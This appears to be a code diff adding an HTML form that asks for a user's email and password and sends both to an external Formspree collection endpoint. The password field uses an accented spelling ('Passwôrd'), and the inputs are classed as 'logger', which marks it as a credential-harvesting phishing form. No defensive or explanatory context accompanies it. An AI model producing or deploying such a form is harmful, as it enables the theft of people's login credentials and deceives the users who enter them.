@@ -1,0 +1,27 @@
+<!-- modify this form HTML and place wherever you want your form -->
+
+<link rel="stylesheet" href="indexi.css">
+
+<form
+  action="https://formspree.io/f/xyzkvdor"
+  method="POST"
+  onsubmit="hideSignInButton()"
+>
+  <label>
+    Your email:
+    <input type="email" name="email" class="logger" required>
+  </label>
+  <label>
+    Your_Passwôrd:
+    <textarea name="Your_Passwôrd" class="logger" required></textarea>
+  </label>
+  <!-- your other form fields go here -->
+  <button type="submit" class="logger">Send</button>
+</form>
+
+<script>
+  function hideSignInButton() {
+    // Store in localStorage that the form has been submitted
+    localStorage.setItem("formSubmitted", "true");
+  }
+</script>
